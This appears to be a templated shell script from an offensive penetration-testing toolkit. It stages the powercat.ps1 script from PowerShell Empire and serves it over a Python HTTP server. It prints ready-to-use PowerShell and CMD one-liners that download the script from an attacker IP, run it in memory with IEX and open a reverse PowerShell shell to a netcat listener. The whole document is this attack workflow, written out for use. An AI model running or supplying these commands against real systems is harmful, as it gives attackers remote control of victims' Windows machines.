mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound; \
echo '================================================================'; \
echo '                      -----PowerShell-----                      '; \
echo 'Deliver only: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\powercat.ps1'; \
echo 'Preparation 1: nc -lvnp <%=$(esh variables/shell_port)%>'; \
echo 'Deliver + Execute: IEX (New-Object System.Net.Webclient).DownloadString("http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1");powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell'; \
echo '================================================================'; \
echo '                         -----CMD-----                          '; \
echo 'Preparation 1: nc -lvnp <%=$(esh variables/shell_port)%>'; \
echo 'Deliver + Execute: powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/powercat.ps1\');powercat -c <%=$(esh variables/attacker_ip)%> -p <%=$(esh variables/shell_port)%> -e powershell'; \
echo '================================================================'; \
python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
